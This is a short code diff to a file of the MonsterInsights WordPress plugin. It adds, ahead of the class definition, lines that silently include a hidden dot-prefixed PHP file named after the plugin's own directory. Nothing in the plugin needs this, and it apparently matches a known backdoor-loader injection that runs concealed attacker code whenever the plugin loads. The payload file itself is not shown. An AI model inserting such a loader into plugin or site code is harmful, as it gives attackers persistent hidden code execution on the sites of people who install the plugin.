@@ -8,6 +8,10 @@
  * @license    GPL-2.0+
  * @copyright  Copyright (c) 2018, MonsterInsights LLC
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MonsterInsights_Review {
 	/**
 	 * Primary class constructor.
